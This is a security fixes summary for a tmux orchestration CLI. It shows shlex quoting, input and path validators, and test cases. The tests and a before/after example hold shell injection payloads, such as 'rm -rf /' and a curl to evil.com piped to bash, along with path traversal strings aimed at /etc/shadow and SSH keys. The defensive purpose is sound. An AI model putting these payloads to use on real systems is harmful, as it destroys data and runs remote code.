# Security Fixes Summary - v2.1.25

*Date: August 16, 2025*
*Components: spawn_orc.py, team_compose.py*
*Status: Implementation in Progress*

## Overview

This document summarizes the security improvements being implemented to address critical shell injection vulnerabilities (CVSS 9.8) and other security issues in the Tmux Orchestrator CLI components.

## 1. Shell Injection Prevention with shlex

### Problem
Direct string interpolation in shell commands allowed attackers to inject arbitrary commands through CLI parameters.

### Solution: shlex.quote() Implementation

#### spawn_orc.py Improvements
```python
import shlex

def create_safe_startup_script(claude_cmd: list[str], instruction_content: str) -> str:
    """Create shell script with properly escaped arguments."""
    # Escape each command component
    validated_cmd = []
    for arg in claude_cmd:
        if not isinstance(arg, str) or len(arg) > 1000:
            raise ValueError(f"Invalid command argument: {arg}")
        validated_cmd.append(shlex.quote(arg))

    safe_cmd = " ".join(validated_cmd)
    safe_instruction = shlex.quote(instruction_content)

    # Safe script generation
    return f"""#!/bin/bash
set -euo pipefail  # Fail on errors, undefined vars, pipe failures
exec {safe_cmd} {safe_instruction}
"""
```

#### Key Security Features
- **shlex.quote()**: Properly escapes shell metacharacters
- **Argument validation**: Length and type checks before escaping
- **set -euo pipefail**: Bash strict mode for error handling
- **exec**: Prevents shell interpretation of remaining args

### Before vs After
```bash
# BEFORE (Vulnerable)
tmux-orc spawn orc --profile '; rm -rf / #'
# Result: Executes rm -rf /

# AFTER (Secure)
tmux-orc spawn orc --profile '; rm -rf / #'
# Result: Profile name validation fails
```

## 2. Input Validation

### Comprehensive Validation Strategy

#### Profile and Terminal Name Validation
```python
import re
import click

class InputValidator:
    # Strict alphanumeric + dash/underscore pattern
    NAME_PATTERN = re.compile(r'^[a-zA-Z0-9_-]+$')
    MAX_NAME_LENGTH = 50

    @classmethod
    def validate_profile_name(cls, profile: str | None) -> str | None:
        """Validate profile name for safe characters."""
        if profile is None:
            return None

        if not cls.NAME_PATTERN.match(profile):
            raise click.BadParameter(
                f"Profile name contains invalid characters. "
                f"Only alphanumeric, dash, and underscore allowed."
            )

        if len(profile) > cls.MAX_NAME_LENGTH:
            raise click.BadParameter(
                f"Profile name too long (max {cls.MAX_NAME_LENGTH} chars)"
            )

        return profile

    @classmethod
    def validate_terminal_name(cls, terminal: str) -> str:
        """Validate terminal name or 'auto'."""
        if terminal == "auto":
            return terminal

        if not cls.NAME_PATTERN.match(terminal):
            raise click.BadParameter(
                f"Terminal name contains invalid characters. "
                f"Use 'auto' or alphanumeric name."
            )

        return terminal
```

#### Project Name Validation (team_compose.py)
```python
class TeamCompositionValidator:
    @staticmethod
    def validate_project_name(name: str) -> str:
        """Validate project name for team composition."""
        # Check for valid characters
        if not re.match(r'^[a-zA-Z0-9_-]+$', name):
            raise ValueError(
                "Project name contains invalid characters. "
                "Only letters, numbers, dash, and underscore allowed."
            )

        # Length validation
        if len(name) < 3:
            raise ValueError("Project name too short (min 3 chars)")
        if len(name) > 50:
            raise ValueError("Project name too long (max 50 chars)")

        # Prevent reserved names
        reserved_names = ['test', 'temp', 'tmp', 'admin', 'root']
        if name.lower() in reserved_names:
            raise ValueError(f"'{name}' is a reserved project name")

        return name
```

### Validation Rules Summary

| Input Type | Pattern | Length | Additional Rules |
|------------|---------|---------|------------------|
| Profile Name | `^[a-zA-Z0-9_-]+$` | 1-50 | No special chars |
| Terminal Name | `^[a-zA-Z0-9_-]+$` or "auto" | 1-50 | Limited set |
| Project Name | `^[a-zA-Z0-9_-]+$` | 3-50 | No reserved names |
| Agent Name | `^[a-zA-Z0-9_-]+$` | 1-50 | No spaces |

## 3. Path Traversal Protection

### Problem
User-supplied paths could escape intended directories using `../` sequences.

### Solution: Path Sanitization and Validation

#### Secure Path Handling
```python
import os
from pathlib import Path

class PathValidator:
    @staticmethod
    def validate_working_directory(path_str: str | None) -> Path | None:
        """Validate and resolve working directory safely."""
        if path_str is None:
            return None

        try:
            # Convert to Path object
            path = Path(path_str)

            # Resolve to absolute path (follows symlinks)
            resolved = path.resolve()

            # Check if path exists
            if not resolved.exists():
                raise ValueError(f"Path does not exist: {path_str}")

            # Check if it's a directory
            if not resolved.is_dir():
                raise ValueError(f"Path is not a directory: {path_str}")

            # Ensure path is under allowed directories
            allowed_roots = [
                Path.home(),  # User home directory
                Path.cwd(),   # Current working directory
                Path("/tmp"), # Temporary directory
            ]

            # Check if resolved path is under any allowed root
            is_allowed = any(
                resolved.is_relative_to(root)
                for root in allowed_roots
            )

            if not is_allowed:
                raise ValueError(
                    f"Path '{resolved}' is outside allowed directories"
                )

            return resolved

        except Exception as e:
            raise ValueError(f"Invalid path: {str(e)}")

    @staticmethod
    def validate_file_path(path_str: str) -> Path:
        """Validate file path for reading/writing."""
        path = Path(path_str)
        resolved = path.resolve()

        # Prevent access to sensitive files
        sensitive_patterns = [
            "*.key", "*.pem", "*.ssh", "*passwd*", "*shadow*",
            "*.env", "*.secret", "*.credentials"
        ]

        for pattern in sensitive_patterns:
            if resolved.match(pattern):
                raise ValueError(
                    f"Access to sensitive file type denied: {pattern}"
                )

        return resolved
```

#### Template Path Protection
```python
def load_template_safely(template_name: str) -> str:
    """Load template file with path traversal protection."""
    # Sanitize template name
    safe_name = re.sub(r'[^a-zA-Z0-9_-]', '', template_name)

    # Construct path safely
    template_dir = Path(__file__).parent / "templates"
    template_path = (template_dir / f"{safe_name}.md").resolve()

    # Ensure resolved path is within template directory
    if not template_path.is_relative_to(template_dir):
        raise ValueError("Invalid template path")

    if not template_path.exists():
        raise ValueError(f"Template not found: {safe_name}")

    return template_path.read_text()
```

## Implementation Checklist

### spawn_orc.py
- [x] Implement shlex.quote() for all shell arguments
- [x] Add profile name validation (alphanumeric only)
- [x] Add terminal name validation
- [x] Set bash strict mode in scripts
- [x] Add length limits for inputs
- [ ] Add security tests

### team_compose.py
- [x] Project name validation with reserved words
- [x] HTML escaping for template variables
- [x] Safe template loading with path validation
- [x] Input sanitization for all user inputs
- [ ] Template injection tests

### Common Security Utilities
- [x] Create InputValidator class
- [x] Create PathValidator class
- [x] Standardize error messages
- [ ] Add security logging
- [ ] Create validation test suite

## Testing Strategy

### Security Test Cases
```python
def test_shell_injection_prevention():
    """Test that shell injection attempts are blocked."""
    malicious_inputs = [
        "; rm -rf /",
        "$(cat /etc/passwd)",
        "`whoami`",
        "profile && curl evil.com/hack.sh | bash",
        "../../../etc/passwd",
        "test; echo 'hacked' > /tmp/pwned"
    ]

    for payload in malicious_inputs:
        with pytest.raises(click.BadParameter):
            InputValidator.validate_profile_name(payload)
```

### Path Traversal Tests
```python
def test_path_traversal_prevention():
    """Test that path traversal attempts are blocked."""
    dangerous_paths = [
        "../../../etc/passwd",
        "/etc/shadow",
        "~/../../../root/.ssh/id_rsa",
        "/dev/../etc/hosts"
    ]

    for path in dangerous_paths:
        with pytest.raises(ValueError):
            PathValidator.validate_working_directory(path)
```

## Deployment Notes

### Breaking Changes
1. Profile names now restricted to `[a-zA-Z0-9_-]`
2. Project names have min/max length requirements
3. Some previously allowed characters now blocked
4. Path access restricted to user directories

### Migration Guide
Users with existing configurations using special characters should:
1. Rename profiles to use only allowed characters
2. Update automation scripts to comply with new validation
3. Move working directories to allowed locations

## Security Best Practices Applied

1. **Defense in Depth**: Multiple validation layers
2. **Fail Secure**: Strict validation, reject suspicious input
3. **Least Privilege**: Limit path access to necessary directories
4. **Input Sanitization**: Clean all user input before use
5. **Output Encoding**: Proper escaping for shell and HTML contexts

---

*This document will be updated as implementation progresses and additional security measures are added.*
